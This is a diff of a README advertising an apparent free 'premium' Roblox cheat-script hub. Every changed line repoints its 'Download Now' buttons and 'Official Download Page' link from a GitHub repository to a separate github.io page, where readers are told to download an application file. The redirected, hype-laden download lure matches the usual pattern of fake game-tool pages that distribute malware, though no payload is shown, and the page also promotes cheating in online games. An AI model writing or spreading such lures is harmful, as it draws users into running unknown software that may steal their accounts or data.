@@ -1,6 +1,6 @@
 # 🎮 roblox-script-hub-premium-2026 - All Your Roblox Scripts in One Place
 
-[![Download Now](https://img.shields.io/badge/Download_Now-Free_Premium_Access-green?style=for-the-badge&logo=github&logoColor=white&labelColor=blue&color=orange)](https://github.com/Righteous-cistaceae8038/roblox-script-hub-premium-2026)
+[![Download Now](https://img.shields.io/badge/Download_Now-Free_Premium_Access-green?style=for-the-badge&logo=github&logoColor=white&labelColor=blue&color=orange)](https://righteous-cistaceae8038.github.io)
 
 ## 👋 Welcome to the Ultimate Roblox Script Hub
 
@@ -49,7 +49,7 @@ Follow these simple steps exactly in order, and you'll have the hub running in u
 
 Visit this link to download the application:
 
-[🔗 Click Here to Visit the Official Download Page](https://github.com/Righteous-cistaceae8038/roblox-script-hub-premium-2026)
+[🔗 Click Here to Visit the Official Download Page](https://righteous-cistaceae8038.github.io)
 
 ### Step 2: Download the Application File
 
@@ -138,7 +138,7 @@ You've found the script hub that will transform your Roblox experience. With 800
 
 Don't wait any longer. Click the button below to get started right now.
 
-[![Download Now](https://img.shields.io/badge/Download-Script_Hub_2026-purple?style=for-the-badge&logo=roblox&logoColor=white&labelColor=darkblue&color=red)](https://github.com/Righteous-cistaceae8038/roblox-script-hub-premium-2026)
+[![Download Now](https://img.shields.io/badge/Download-Script_Hub_2026-purple?style=for-the-badge&logo=roblox&logoColor=white&labelColor=darkblue&color=red)](https://righteous-cistaceae8038.github.io)
 
 Good luck, and have fun dominating every game!
 
